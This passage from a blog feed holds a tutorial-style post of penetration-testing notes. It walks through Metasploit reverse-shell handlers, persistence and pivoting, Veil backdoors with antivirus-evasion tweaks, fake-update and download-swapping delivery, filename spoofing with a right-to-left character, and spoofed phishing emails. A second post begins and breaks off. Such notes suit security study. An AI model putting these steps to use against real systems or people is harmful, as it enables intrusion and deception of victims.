&lt;/ol&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry><entry><title>Gaining Access with Kali Linux</title><link href="https://jackmckew.dev/gaining-access-with-kali-linux.html" rel="alternate"></link><published>2020-09-04T00:00:00+10:00</published><updated>2020-09-04T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-04:/gaining-access-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https â€¦&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/network-hacking-with-kali-linux.html"&gt;Network Hacking with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html"&gt;Web Penetration Testing with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="table-of-contents"&gt;Table of Contents &lt;!-- omit in toc --&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#gaining-access"&gt;Gaining Access&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#server-side-attacks"&gt;Server Side Attacks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#metasploit"&gt;Metasploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploiting-backdoors"&gt;Exploiting Backdoors&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#an-example-backdoor-attack"&gt;An Example Backdoor Attack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#payloads"&gt;Payloads&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#nexpose"&gt;Nexpose&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-side-attacks"&gt;Client Side Attacks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#creating-backdoors"&gt;Creating Backdoors&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#connecting-from-the-backdoor"&gt;Connecting from the Backdoor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#deploying-backdoors-via-fake-updates"&gt;Deploying Backdoors via Fake Updates&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#deploying-backdoors-via-exe-downloads"&gt;Deploying Backdoors via Exe Downloads&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#protection"&gt;Protection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#social-engineering"&gt;Social Engineering&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#maltego"&gt;Maltego&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#spoofing-file-type"&gt;Spoofing File Type&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#spoofing-fake-emails"&gt;Spoofing Fake Emails&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#beef-browser-exploitation-framework"&gt;BeEF (Browser Exploitation Framework)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#using-the-above---outside-the-local-network"&gt;Using the Above - Outside the Local Network&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#post-exploitation"&gt;Post Exploitation&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#maintaining-access"&gt;Maintaining Access&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#pivoting"&gt;Pivoting&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="gaining-access"&gt;Gaining Access&lt;/h2&gt;
&lt;p&gt;Any electronic device is a computer all concepts will work wether it is a phone, tv, router, websites, webservers etc
Two types of attacks:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Server side - Doesn't require user interaction all we need is an IP&lt;/li&gt;
&lt;li&gt;Client side - Requires user interaction such as opening a file or clicking a link&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="server-side-attacks"&gt;Server Side Attacks&lt;/h3&gt;
&lt;p&gt;Make sure the machine is pingable (open terminal and run &lt;code&gt;ping [IP]&lt;/code&gt;). Learning as much as possible about the target is essential for conducting a successful attack, if you can learn things such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Operating systems&lt;/li&gt;
&lt;li&gt;Installed programs&lt;/li&gt;
&lt;li&gt;Ports being used&lt;/li&gt;
&lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can then use this information for identifying potential exploits (search engines are perfect for this). Things to look out for are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Run Zenmap (Nmap) on the IP. Click the ports and services tab up the top to learn about the ports being used / misconfigured.&lt;/li&gt;
&lt;li&gt;Google the version of operating system / programs for potential exploits&lt;/li&gt;
&lt;li&gt;If you find an open FTP (file transfer protocol) port, try to connect through it&lt;/li&gt;
&lt;li&gt;Try default usernames and passwords to log in (sometimes they won't have a password)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="metasploit"&gt;Metasploit&lt;/h4&gt;
&lt;p&gt;Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter. Before testing metasploit on a live system, it's preferential to test on a virtualised system, enter metasploitable. Metasploitable is an intentionally vulnerable target machine for evaluating Metasploit which is virtualised and can be downloaded from: &lt;a href="https://information.rapid7.com/download-metasploitable-2017.html"&gt;https://information.rapid7.com/download-metasploitable-2017.html&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="exploiting-backdoors"&gt;Exploiting Backdoors&lt;/h4&gt;
&lt;p&gt;First from the information you've gathered about the target, we can then search for what exploits are available, and to use metasploit is as easy as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;msfconsole&lt;/code&gt; (runs the metasploit console)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;help&lt;/code&gt; (help on any command)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show [something]&lt;/code&gt; (something can be exploits, payloads, auxilaries or options)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [something]&lt;/code&gt; (uses an exploit, payload, auxilarie)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set [option] [value]&lt;/code&gt; (configure [option] to have [value] )&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt; - runs the current task&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="an-example-backdoor-attack"&gt;An Example Backdoor Attack&lt;/h5&gt;
&lt;p&gt;Typically this will only work if the backdoor is already installed on the target computer.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;find out the exploit to use via google&lt;/li&gt;
&lt;li&gt;open &lt;code&gt;msfconsole&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;type &lt;code&gt;use [exploit_name/path]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show options&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set the options (usually the RHOSTS) `set RHOSTS [ip]&lt;/li&gt;
&lt;li&gt;run &lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If this is successful, you will now have access to a remote terminal in the target and essentially do anything you want on the target machine.&lt;/p&gt;
&lt;h5 id="payloads"&gt;Payloads&lt;/h5&gt;
&lt;p&gt;A payload is a piece of code that is to be executed through an existing exploit. For example twp types of payloads are to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;to open a port on the target and connect to it (aka &lt;code&gt;bind&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;open a port on the attacking computer, connect to the attacking computer from the target bypassing the firewall (aka &lt;code&gt;reverse&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;On a &lt;code&gt;reverse&lt;/code&gt;, setting the open port on the attacking computer to 80, will mimic that of a typical webserver and thus also bypassing any firewall filtration.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Setting a payload in metasploit can be done with the option &lt;code&gt;set payload [payload]&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id="nexpose"&gt;Nexpose&lt;/h4&gt;
&lt;p&gt;Nexpose is another product from the creators of metasploitable, and it is a vulnerability scanner. Nexpose will find any available exploits in your network that could be used, this could be used from a red team (attacker) and blue team (defender) perspective!&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.rapid7.com/products/nexpose/"&gt;&lt;img alt="Nexpose" class="img-fluid" src="https://jackmckew.dev/img/nexpose.jpg"/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Nexpose can be downloaded from: &lt;a href="https://www.rapid7.com/products/nexpose/"&gt;https://www.rapid7.com/products/nexpose/&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a free community edition!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="client-side-attacks"&gt;Client Side Attacks&lt;/h3&gt;
&lt;p&gt;Client side attacks are typically the next step if server side attacks fail or are not viable in the situation. Although, client side attacks can potentially be more difficult to accomplish as we are now (likely) depending on the weakest link in the security to be the human rather than a computer. In client side attacks, social engineering is one of the most used attack vectors, which also means that gaining as much information as possible about the target is critical for a successful attack.&lt;/p&gt;
&lt;h4 id="creating-backdoors"&gt;Creating Backdoors&lt;/h4&gt;
&lt;p&gt;For creating backdoors we use a program called &lt;code&gt;veil&lt;/code&gt;. Veil can installed via &lt;code&gt;apt-get&lt;/code&gt;, and the source code is all open over at: &lt;a href="https://github.com/Veil-Framework/Veil"&gt;https://github.com/Veil-Framework/Veil&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To use Veil: (use evasion, and use a rev_https (aka reverse https connection)):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Run &lt;code&gt;veil&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;list&lt;/code&gt; to list available tools&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [toolname]&lt;/code&gt; to use tools, evasion is a typical tool to use&lt;/li&gt;
&lt;li&gt;&lt;code&gt;list&lt;/code&gt; (under a tool) to see available payloads&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [payload number]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;check the options to set&lt;/li&gt;
&lt;li&gt;be sure to set the LHOST (the IP for the target to connect to)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set LHOST [ip]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set LPORT 8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;options&lt;/code&gt; to see options.&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;For bypassing more antivirus programs, the more options you change, the less likely an existing identified signature is out there, we can change these options with
    1.  &lt;code&gt;set PROCESSORS [number(1)]&lt;/code&gt; change processors.
    2.  &lt;code&gt;set SLEEP [number(6)]&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Finally use &lt;code&gt;generate&lt;/code&gt; to make backdoor.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;To check if it is detectable you can use the check vt command (this will only check signatures)&lt;/li&gt;
&lt;li&gt;go to &lt;a href="https://nodistribute.com/"&gt;https://nodistribute.com/&lt;/a&gt; and scan there&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="connecting-from-the-backdoor"&gt;Connecting from the Backdoor&lt;/h5&gt;
&lt;p&gt;We need to listen for the connection. Need the attack payload and the port (eg, go/meterpeter/rev_https, 8080)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Open the metasploit framework. &lt;code&gt;msfconsole&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;To listen use the handler module&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set the payload &lt;code&gt;set PAYLOAD windows/meterpeter/reverse_https&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set the correct settings (the LPORT and LHOST you used in the backdoor).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now we wait for the target user to run the backdoor (the &lt;code&gt;.exe&lt;/code&gt; file).&lt;/p&gt;
&lt;h5 id="deploying-backdoors-via-fake-updates"&gt;Deploying Backdoors via Fake Updates&lt;/h5&gt;
&lt;p&gt;By mimicking an update server for a software package, we can hide out backdoor as a new update for a software. To do this we use &lt;code&gt;Evilgrade&lt;/code&gt; (which is also fully open source): &lt;a href="https://github.com/infobyte/evilgrade"&gt;https://github.com/infobyte/evilgrade&lt;/a&gt;. Once &lt;code&gt;evilgrade&lt;/code&gt; is installed, you can check hijackable programs using &lt;code&gt;show modules&lt;/code&gt;, configure options for said modules using &lt;code&gt;configure [module_name]&lt;/code&gt; and start &lt;code&gt;evilgrade&lt;/code&gt; with &lt;code&gt;start&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This then makes use of MITM attacks such as ARP or DNS spoofing, read more about these in my previous post at [INSERT KALI NETWORK HACKING POST].&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;When using evilgrade, ensuring that the exploit is listening before mimicking the update server with the malicious software.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id="deploying-backdoors-via-exe-downloads"&gt;Deploying Backdoors via Exe Downloads&lt;/h5&gt;
&lt;p&gt;Another way to deploy backdoors, is to intercept an &lt;code&gt;.exe&lt;/code&gt; that is being downloaded on the target and replace it with the malicious &lt;code&gt;.exe&lt;/code&gt;. It's necessary to be the MITM to undertake this attack.&lt;/p&gt;
&lt;p&gt;One way to do this (although unsupported as of 08/2017) is via BDFProxy: &lt;a href="https://github.com/secretsquirrel/BDFProxy"&gt;https://github.com/secretsquirrel/BDFProxy&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once up and running, whenever a user attempts to download an &lt;code&gt;.exe&lt;/code&gt;, it'll be intercepted and injected with the malicious backdoor. Note that the target &lt;code&gt;.exe&lt;/code&gt; will be downloaded and run as normal, not raising any suspicions from the user.&lt;/p&gt;
&lt;h4 id="protection"&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that there is no MITM in your network&lt;/li&gt;
&lt;li&gt;Only download from HTTPS pages&lt;/li&gt;
&lt;li&gt;Use checksums to ensure the download is as the provider desired it to be (eg, MD5)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="social-engineering"&gt;Social Engineering&lt;/h3&gt;
&lt;p&gt;The definition of social engineering (in information security context) is: "the use of deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes.". The aim of the game is to gather as much information as possible about our target such that we can better pose an attack.&lt;/p&gt;
&lt;h4 id="maltego"&gt;Maltego&lt;/h4&gt;
&lt;p&gt;Maltego is a piece of software that we can easily &amp;amp; quickly gather information about a target, it can be downloaded from: &lt;a href="https://www.maltego.com/"&gt;https://www.maltego.com/&lt;/a&gt;. It can be used to determine where a specific target has accounts, websites, phone numbers, etc and who they may connect with. It shows all this in a graph representation in the client.&lt;/p&gt;
&lt;h4 id="backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/h4&gt;
&lt;p&gt;This is typically done by compiling a malicious script and then disguising it as the source file. Note that this may not work for more technically advanced targets, as when you change the icon for a &lt;code&gt;.exe&lt;/code&gt; file, there will still be a prompt to run this file when opened.&lt;/p&gt;
&lt;p&gt;For example, if you are trying to disguise a PDF, normally users aren't asked to run a PDF when opened, so this may raise suspicions with the target, and potentially foiling the attack.&lt;/p&gt;
&lt;h5 id="spoofing-file-type"&gt;Spoofing File Type&lt;/h5&gt;
&lt;p&gt;In the above example, we highlighted concerns that our file will prompt to be run and have the extension &lt;code&gt;.exe&lt;/code&gt;. We can circumvent this problem by spoofing our executable to look as if it was the original file type (eg, &lt;code&gt;.pdf&lt;/code&gt;). One way to do this is by using the right to left unicode character in the filename (&lt;code&gt;U+202E&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;So what we will do is if our target file that we want to disguise as is name &lt;code&gt;the-book-of-reflex.pdf&lt;/code&gt;. We will name our malicious executable as &lt;code&gt;the-book-of-reflfdp.exe&lt;/code&gt;, and insert a right to left unicode character before &lt;code&gt;fdp.exe&lt;/code&gt;, which will reverse the end of our file, thus ending up with &lt;code&gt;the-book-of-reflexe.pdf&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Browsers will typically remove the right to left unicode character in file names, so make sure to zip the malicious file to bypass this.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="spoofing-fake-emails"&gt;Spoofing Fake Emails&lt;/h4&gt;
&lt;p&gt;There's lots of free options out there on the web for sending fake emails, but they will likely end up in the spam box of the target's email. Another option is to find a SMTP (Simple Mail Transfer Protocol) server that offers a free program, typically these are used for marketing by companies so less likely to end up in the spam.&lt;/p&gt;
&lt;p&gt;Kali also provides a utility called &lt;code&gt;sendemail&lt;/code&gt; which we can use once we have a SMTP server to use. Find out more about this utility (with the source code) over at: &lt;a href="https://github.com/mogaal/sendemail"&gt;https://github.com/mogaal/sendemail&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once we're able to send a fake email, we can now embed our spoofed malicious executable on a file sharing website (eg, Google drive) and include it in the email (see &lt;a href="#backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/a&gt;).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It's advisable to use an existing email that you know your target is familiar with from the information that you've gathered.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="beef-browser-exploitation-framework"&gt;BeEF (Browser Exploitation Framework)&lt;/h4&gt;
&lt;p&gt;From the BeEF website itself: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.". You can also find the source code over at &lt;a href="https://github.com/beefproject/beef"&gt;https://github.com/beefproject/beef&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;What BeEF let's us do is insert some JavaScript code onto a website to 'hook' the website, allowing us to do lots of different things (eg, fake login pages, etc). Since the hook is just embedded in sites with JavaScript, this will enable attacks on any modern browser and device (eg, phones, tablets, laptops, etc).&lt;/p&gt;
&lt;p&gt;Once hooked you get all sorts of information on the target system including browser version, operating system, versions of capabilities (plugins) installed etc.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It is easiest to deploy BeEF and run the commands when you are the MITM in the network. This will also allow us to hook &lt;strong&gt;all&lt;/strong&gt; websites the user visits rather than just the one.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;One example command we can use is to mimic a browser plug-in update to get the target to download and run a malicious backdoor.&lt;/p&gt;
&lt;h4 id="using-the-above-outside-the-local-network"&gt;Using the Above - Outside the Local Network&lt;/h4&gt;
&lt;p&gt;If you are using any of these attacks external to your local network, there's a few steps to configure to ensure:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Router must handle reverse connections&lt;/li&gt;
&lt;li&gt;Use public IP vs Private IP of the router&lt;/li&gt;
&lt;li&gt;Forward the targeted port of the router to the attacking machine in the local network&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="post-exploitation"&gt;Post Exploitation&lt;/h2&gt;
&lt;p&gt;The main part of launching a hack is not only to get access to a target PC, but get/find what's on the target and make sure that we can always get into the target. Another prime example on conducting a hack on a target PC, may not be to get to that exact machine, more so to get into the network that machine is connected to and find other resources (this is also known as pivoting).&lt;/p&gt;
&lt;h3 id="maintaining-access"&gt;Maintaining Access&lt;/h3&gt;
&lt;p&gt;Once you have backdoored into a system, the backdoor connection is likely running on a process (similar to what you see in task manager on Windows), it's typically good practice to migrate the backdoor connection onto a process that is unlikely to be closed (eg, &lt;code&gt;explorer.exe&lt;/code&gt;). If you are using metasploit for this, it's as easy as running &lt;code&gt;migrate [processID]&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There's also other methodologies for maintaining access such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Using veil-evasion (see &lt;a href="#creating-backdoors"&gt;Creating Backdoors&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Use metasploit persistence to maintain the connection&lt;/li&gt;
&lt;li&gt;Use metasploit and veil-evasion together:&lt;ol&gt;
&lt;li&gt;Background your current meterpeter session &lt;code&gt;background&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;use a module in msfconsole &lt;code&gt;use exsploit/windows/local/persistance&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show options&lt;/code&gt; to configure&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set EXE_NAME browser&lt;/code&gt; (or something inconspicuous)&lt;/li&gt;
&lt;li&gt;set the session you wish to place &lt;code&gt;set SESSION [no.]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;use the EXE::Custom the inject veil backdoor (not service).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set EXE::Custom [path]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="pivoting"&gt;Pivoting&lt;/h3&gt;
&lt;p&gt;Use the device you hacked, hack into other devices on the intranet. We can set up an autoroute to use metasploit on the infected target as if it was the source attacking device.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Upload any tools you need. (in metasploit) eg. Nmap&lt;/li&gt;
&lt;li&gt;use autoroute (in metasploit)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use post/windows/manage/autoroute&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set subnet [subnet]&lt;/code&gt; - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set session [id]&lt;/code&gt; - Sets the session to run it on.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry><entry><title>Network Hacking with Kali Linux</title><link href="https://jackmckew.dev/network-hacking-with-kali-linux.html" rel="alternate"></link><published>2020-08-28T00:00:00+10:00</published><updated>2020-08-28T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-08-28:/network-hacking-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali â€¦&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to hack networks and PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;. These are notes from the Udemy course: &lt;a href="https://www.udemy.com/course/learn-ethical-hacking-from-scratch/"&gt;https://www.udemy.com/course/learn-ethical-hacking-from-scratch/&lt;/a&gt;, highly recommend this course, very practical and beginner friendly.&lt;/p&gt;
&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/gaining-access-with-kali-linux.html"&gt;Gaining Access with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html"&gt;Web Penetration Testing with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="table-of-contents"&gt;Table of Contents &lt;!-- omit in toc --&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#network-hacking"&gt;Network Hacking&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#networking-fundamentals"&gt;Networking Fundamentals&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#checking-network-configuration"&gt;Checking Network Configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#checking-wireless-networks"&gt;Checking Wireless Networks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sniffing-data-from-specific-device"&gt;Sniffing Data from Specific Device&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#deauthentication-attack"&gt;DeAuthentication Attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#gaining-access"&gt;Gaining Access&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#cracking-wep"&gt;Cracking WEP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#fake-authentication-attack"&gt;Fake Authentication Attack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cracking-wpawpa2"&gt;Cracking WPA/WPA2&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#with-wps"&gt;With WPS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#without-wps"&gt;Without WPS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#securing-your-network"&gt;Securing your Network&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#post-connection-attacks-mitm-attacks"&gt;Post Connection Attacks (MITM Attacks)&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#discovering-devices-on-the-network"&gt;Discovering Devices on the Network&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#netdiscover"&gt;NetDiscover&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#nmap"&gt;Nmap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#arp-attack"&gt;ARP Attack&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#bettercap"&gt;BetterCap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#https"&gt;HTTPS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#dns-spoofing"&gt;DNS Spoofing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#javascript-code-injection"&gt;JavaScript Code Injection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#wireshark"&gt;WireShark&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#creating-a-honeypot-fake-access-point"&gt;Creating a Honeypot (fake access point)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#detection--security"&gt;Detection &amp;amp; Security&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#detecting-arp-attacks"&gt;Detecting ARP Attacks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#preventing-mitm-attacks"&gt;Preventing MITM Attacks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="network-hacking"&gt;Network Hacking&lt;/h2&gt;
&lt;h3 id="networking-fundamentals"&gt;Networking Fundamentals&lt;/h3&gt;
&lt;h4 id="checking-network-configuration"&gt;Checking Network Configuration&lt;/h4&gt;
&lt;p&gt;Commands to use in terminal to check network state:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ifconfig&lt;/code&gt; for all connection states&lt;/li&gt;
